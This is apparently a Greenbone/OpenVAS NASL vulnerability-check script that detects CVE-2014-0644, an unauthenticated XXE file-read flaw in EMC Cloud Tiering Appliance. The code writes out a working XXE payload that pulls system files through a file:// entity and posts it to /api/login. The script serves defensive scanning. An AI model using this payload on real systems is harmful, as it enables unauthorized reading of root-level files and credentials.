# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103931");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2014-0644");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-04-01 11:51:50 +0200 (Tue, 01 Apr 2014)");
  script_name("EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/32623/");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2014/Mar/426");

  script_tag(name:"summary", value:"EMC Cloud Tiering Appliance (CTA) is susceptible to an
  unauthenticated XML external entity (XXE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"EMC CTA is susceptible to an unauthenticated XXE attack that
  allows an attacker to read arbitrary files from the file system with the permissions of the root
  user.");

  script_tag(name:"impact", value:"An attacker can read arbitrary files from the file system with
  the permissions of the root user.");

  script_tag(name:"affected", value:"EMC CTA version 10.0 through SP1 is known to be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port( default:443 );

buf = http_get_cache( item:"/", port:port );

if( ! buf || "EMC Cloud Tiering" >!< buf )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  xxe = '<?xml version="1.0" encoding="ISO-8859-1"?>\n' +
        '<!DOCTYPE foo [\n' +
        '<!ELEMENT foo ANY >\n' +
        '<!ENTITY xxe SYSTEM "file:///' + file + '" >]>\n' +
        '<Request>\n' +
        '<Username>root</Username>\n' +
        '<Password>&xxe;</Password>\n' +
        '</Request>';

  len = strlen( xxe );

  url = "/api/login";
  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Accept-Encoding: identity\r\n' +
        'Cookie: JSESSIONID=12818F1AC5C744CF444B2683ABF6E8AC\r\n' +
        'Connection: keep-alive\r\n' +
        'Referer: https://' + host + '/UxFramework/UxFlashApplication.swf\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        xxe;
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( concl = egrep( string:buf, pattern:pattern ) ) {
    concl = chomp( concl );
    report = http_report_vuln_url( port:port, url:url );
    report += '\nResponse:' + concl;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
